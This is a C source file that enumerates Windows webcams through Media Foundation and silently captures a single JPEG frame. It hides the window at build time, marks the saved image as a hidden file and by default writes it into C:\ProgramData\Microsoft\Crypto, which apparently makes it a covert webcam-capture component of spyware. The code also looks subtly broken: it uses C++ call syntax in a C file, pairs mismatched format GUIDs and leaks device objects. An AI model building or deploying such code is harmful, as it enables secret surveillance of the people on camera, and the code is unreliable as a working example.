/*
 * Windows Camera Capture - Media Foundation
 * 
 * 从第一性原理实现：直接使用 Media Foundation API 捕获摄像头帧
 * 不依赖任何第三方库
 * 
 * 编译: x86_64-w64-mingw32-gcc -O2 -Wall -s -Wl,--subsystem,windows \
 *        -lmfplat -lmfreadwrite -lstrmiids -lole32 -luuid \
 *        windows_camera.c -o camera_capture.exe
 */

#include <windows.h>
#include <mfapi.h>
#include <mfidl.h>
#include <mfreadwrite.h>
#include <mferror.h>
#include <shlwapi.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mfreadwrite.lib")
#pragma comment(lib, "strmiids.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shlwapi.lib")

#define SAFE_RELEASE(p) if (p) { (p)->Release(); (p) = NULL; }

HRESULT EnumerateCameras() {
    HRESULT hr = S_OK;
    IMFAttributes* pAttributes = NULL;
    IMFActivate** ppDevices = NULL;
    UINT32 count = 0;

    // 初始化 Media Foundation
    hr = MFStartup(MF_VERSION);
    if (FAILED(hr)) {
        printf("[-] MFStartup failed: 0x%08x\n", hr);
        return hr;
    }

    // 创建属性存储
    hr = MFCreateAttributes(&pAttributes, 1);
    if (FAILED(hr)) {
        printf("[-] MFCreateAttributes failed\n");
        return hr;
    }

    // 设置源类型为视频捕获设备
    hr = pAttributes->SetGUID(
        MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE,
        MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID
    );
    if (FAILED(hr)) {
        printf("[-] SetGUID failed\n");
        SAFE_RELEASE(pAttributes);
        return hr;
    }

    // 枚举设备
    hr = MFEnumDeviceSources(pAttributes, &ppDevices, &count);
    if (FAILED(hr)) {
        printf("[-] MFEnumDeviceSources failed\n");
        SAFE_RELEASE(pAttributes);
        return hr;
    }

    printf("[+] Found %d video capture devices\n", count);

    for (UINT32 i = 0; i < count; i++) {
        WCHAR* pFriendlyName = NULL;
        UINT32 nameLength = 0;

        // 获取设备友好名称
        hr = ppDevices[i]->GetAllocatedString(
            MF_DEVSOURCE_ATTRIBUTE_FRIENDLY_NAME,
            &pFriendlyName, &nameLength
        );

        if (SUCCEEDED(hr) && pFriendlyName) {
            wprintf(L"  [%d] %s\n", i, pFriendlyName);
            CoTaskMemFree(pFriendlyName);
        }

        SAFE_RELEASE(ppDevices[i]);
    }

    CoTaskMemFree(ppDevices);
    SAFE_RELEASE(pAttributes);
    MFShutdown();

    return S_OK;
}

HRESULT CaptureSingleFrame(LPCWSTR outputPath) {
    HRESULT hr = S_OK;
    IMFMediaSource* pSource = NULL;
    IMFSourceReader* pReader = NULL;
    IMFAttributes* pAttributes = NULL;
    IMFMediaType* pType = NULL;

    // 初始化
    hr = MFStartup(MF_VERSION);
    if (FAILED(hr)) return hr;

    // 枚举并激活第一个设备
    hr = MFCreateAttributes(&pAttributes, 1);
    if (FAILED(hr)) goto cleanup;

    hr = pAttributes->SetGUID(
        MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE,
        MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID
    );
    if (FAILED(hr)) goto cleanup;

    IMFActivate** ppDevices = NULL;
    UINT32 count = 0;
    hr = MFEnumDeviceSources(pAttributes, &ppDevices, &count);
    if (FAILED(hr) || count == 0) {
        printf("[-] No cameras found\n");
        goto cleanup;
    }

    // 激活第一个摄像头
    hr = ppDevices[0]->ActivateObject(IID_PPV_ARGS(&pSource));
    if (FAILED(hr)) {
        printf("[-] Failed to activate camera\n");
        goto cleanup;
    }

    // 创建 SourceReader
    hr = MFCreateSourceReaderFromMediaSource(pSource, NULL, &pReader);
    if (FAILED(hr)) {
        printf("[-] Failed to create SourceReader\n");
        goto cleanup;
    }

    // 设置输出格式为图片
    hr = MFCreateMediaType(&pType);
    if (FAILED(hr)) goto cleanup;

    hr = pType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Image);
    if (FAILED(hr)) goto cleanup;

    hr = pType->SetGUID(MF_MT_SUBTYPE, GUID_ContainerFormatJpeg);
    if (FAILED(hr)) goto cleanup;

    hr = pReader->SetCurrentMediaType(
        (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM,
        NULL, pType
    );
    if (FAILED(hr)) {
        printf("[-] Failed to set media type\n");
        goto cleanup;
    }

    // 读取帧
    DWORD streamIndex, flags;
    LONGLONG llTimestamp;
    IMFSample* pSample = NULL;

    hr = pReader->ReadSample(
        MF_SOURCE_READER_FIRST_VIDEO_STREAM,
        0, &streamIndex, &flags, &llTimestamp, &pSample
    );

    if (SUCCEEDED(hr) && pSample) {
        IMFMediaBuffer* pBuffer = NULL;
        hr = pSample->ConvertToContiguousBuffer(&pBuffer);
        if (SUCCEEDED(hr)) {
            BYTE* pData = NULL;
            DWORD cbData = 0;
            hr = pBuffer->Lock(&pData, NULL, &cbData);
            if (SUCCEEDED(hr) && cbData > 0) {
                // 写入文件
                HANDLE hFile = CreateFileW(
                    outputPath, GENERIC_WRITE, 0, NULL,
                    CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL
                );
                if (hFile != INVALID_HANDLE_VALUE) {
                    DWORD written;
                    WriteFile(hFile, pData, cbData, &written, NULL);
                    CloseHandle(hFile);
                    printf("[+] Frame saved: %ls (%d bytes)\n", outputPath, written);
                }
                pBuffer->Unlock();
            }
            SAFE_RELEASE(pBuffer);
        }
        SAFE_RELEASE(pSample);
    }

cleanup:
    SAFE_RELEASE(pType);
    SAFE_RELEASE(pReader);
    SAFE_RELEASE(pSource);
    SAFE_RELEASE(pAttributes);
    MFShutdown();
    return hr;
}

int wmain(int argc, wchar_t* argv[]) {
    printf("=== Windows Camera Capture (Media Foundation) ===\n\n");

    if (argc > 1 && wcscmp(argv[1], L"list") == 0) {
        EnumerateCameras();
    } else {
        LPCWSTR output = (argc > 1) ? argv[1] : L"C:\\ProgramData\\Microsoft\\Crypto\\capture.jpg";
        HRESULT hr = CaptureSingleFrame(output);
        if (FAILED(hr)) {
            printf("[-] Capture failed: 0x%08x\n", hr);
        }
    }

    return 0;
}
